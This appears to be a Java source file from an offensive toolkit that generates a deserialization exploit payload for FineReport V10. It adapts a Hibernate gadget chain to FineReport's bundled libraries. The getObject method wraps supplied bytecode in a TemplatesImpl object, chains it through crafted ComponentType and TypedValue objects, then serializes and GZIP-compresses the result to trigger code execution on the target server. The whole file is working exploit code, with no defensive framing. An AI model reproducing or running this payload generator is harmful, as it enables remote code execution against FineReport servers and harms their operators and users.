package com.droplab.Controller.FineReport.Common;

import com.droplab.Utils.UnSerialize.utils.Gadgets;
import com.droplab.Utils.UnSerialize.utils.JavaVersion;
import com.droplab.Utils.UnSerialize.utils.Reflections;
import com.fr.third.org.hibernate.EntityMode;
import com.fr.third.org.hibernate.engine.spi.TypedValue;
import com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer;
import com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer;
import com.fr.third.org.hibernate.type.AbstractType;
import com.fr.third.org.hibernate.type.ComponentType;
import com.fr.third.org.hibernate.type.Type;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.GZIPOutputStream;

public class FinereportV10Hibernatel {
    private static FinereportV10Hibernatel finereportV10Hibernatel = null;

    public static FinereportV10Hibernatel instance() {
        if (finereportV10Hibernatel != null) {

        } else {
            finereportV10Hibernatel = new FinereportV10Hibernatel();
        }
        return finereportV10Hibernatel;
    }

    public byte[] getObject(final byte[] command) throws Exception {
        Object tpl = Gadgets.createTemplatesImpl(command);
        Object getters = makeGetter(tpl.getClass(), "getOutputProperties");
        Object o = makeCaller(tpl, getters);
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        GZIPOutputStream gzout = new GZIPOutputStream(bao);
        ObjectOutputStream out = new ObjectOutputStream(gzout);
        out.writeObject(o);
        out.flush();
        out.close();
        gzout.close();
        return bao.toByteArray();
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAtLeast(7);
    }
    public static String[] getDependencies() {
        return System.getProperty("hibernate5") != null ? new String[]{"com.fr.third.org.hibernate:hibernate-core:5.0.7.Final", "aopalliance:aopalliance:1.0", "com.fr.third.org.jboss.logging:jboss-logging:3.3.0.Final", "javax.transaction:javax.transaction-api:1.2"} : new String[]{"com.fr.third.org.hibernate:hibernate-core:4.3.11.Final", "aopalliance:aopalliance:1.0", "com.fr.third.org.jboss.logging:jboss-logging:3.3.0.Final", "javax.transaction:javax.transaction-api:1.2", "dom4j:dom4j:1.6.1"};
    }
    public static Object makeGetter(Class<?> tplClass, String method) throws NoSuchMethodException, SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, ClassNotFoundException {
        return makeHibernate5Getter(tplClass, method);
    }
    public static Object makeHibernate4Getter(Class<?> tplClass, String method) throws ClassNotFoundException, NoSuchMethodException, SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
        Class<?> getterIf = Class.forName("com.fr.third.org.hibernate.property.Getter");
        Class<?> basicGetter = Class.forName("com.fr.third.org.hibernate.property.BasicPropertyAccessor$BasicGetter");
        Constructor<?> bgCon = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
        Reflections.setAccessible(bgCon);
        if (!method.startsWith("get")) {
            throw new IllegalArgumentException("Hibernate4 can only call getters");
        } else {
            String propName = Character.toLowerCase(method.charAt(3)) + method.substring(4);
            Object g = bgCon.newInstance(tplClass, tplClass.getDeclaredMethod(method), propName);
            Object arr = Array.newInstance(getterIf, 1);
            Array.set(arr, 0, g);
            return arr;
        }
    }
    public static Object makeHibernate5Getter(Class<?> tplClass, String method) throws NoSuchMethodException, SecurityException, ClassNotFoundException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
        Class<?> getterIf = Class.forName("com.fr.third.org.hibernate.property.access.spi.Getter");
        Class<?> basicGetter = Class.forName("com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl");
        Constructor<?> bgCon = basicGetter.getConstructor(Class.class, String.class, Method.class);
        Object g = bgCon.newInstance(tplClass, "test", tplClass.getDeclaredMethod(method));
        Object arr = Array.newInstance(getterIf, 1);
        Array.set(arr, 0, g);
        return arr;
    }

    static Object makeCaller(Object tpl, Object getters) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
        return makeHibernate45Caller(tpl, getters);
    }
    static Object makeHibernate45Caller(Object tpl, Object getters) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
        PojoComponentTuplizer tup = (PojoComponentTuplizer)Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
        Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);
        ComponentType t = (ComponentType)Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
        Reflections.setFieldValue(t, "componentTuplizer", tup);
        Reflections.setFieldValue(t, "propertySpan", 1);
        Reflections.setFieldValue(t, "propertyTypes", new Type[]{t});
        TypedValue v1 = new TypedValue(t, (Object)null);
        Reflections.setFieldValue(v1, "value", tpl);
        Reflections.setFieldValue(v1, "type", t);
        TypedValue v2 = new TypedValue(t, (Object)null);
        Reflections.setFieldValue(v2, "value", tpl);
        Reflections.setFieldValue(v2, "type", t);
        return Gadgets.makeMap(v1, v2);
    }
    static Object makeHibernate3Caller(Object tpl, Object getters) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
        Class entityEntityModeToTuplizerMappingClass = Class.forName("com.fr.third.org.hibernate.tuple.entity.EntityEntityModeToTuplizerMapping");
        Class entityModeToTuplizerMappingClass = Class.forName("com.fr.third.org.hibernate.tuple.EntityModeToTuplizerMapping");
        Class typedValueClass = Class.forName("com.fr.third.org.hibernate.engine.TypedValue");
        PojoComponentTuplizer tup = (PojoComponentTuplizer)Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
        Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);
        Reflections.getField(AbstractComponentTuplizer.class, "propertySpan").set(tup, 1);
        ComponentType t = (ComponentType)Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
        HashMap hm = new HashMap();
        hm.put(EntityMode.POJO, tup);
        Object emtm = Reflections.createWithConstructor(entityEntityModeToTuplizerMappingClass, entityModeToTuplizerMappingClass, new Class[]{Map.class}, new Object[]{hm});
        Reflections.setFieldValue(t, "tuplizerMapping", emtm);
        Reflections.setFieldValue(t, "propertySpan", 1);
        Reflections.setFieldValue(t, "propertyTypes", new Type[]{t});
        Constructor<?> typedValueConstructor = typedValueClass.getDeclaredConstructor(Type.class, Object.class, EntityMode.class);
        Object v1 = typedValueConstructor.newInstance(t, null, EntityMode.POJO);
        Reflections.setFieldValue(v1, "value", tpl);
        Reflections.setFieldValue(v1, "type", t);
        Object v2 = typedValueConstructor.newInstance(t, null, EntityMode.POJO);
        Reflections.setFieldValue(v2, "value", tpl);
        Reflections.setFieldValue(v2, "type", t);
        return Gadgets.makeMap(v1, v2);
    }
}
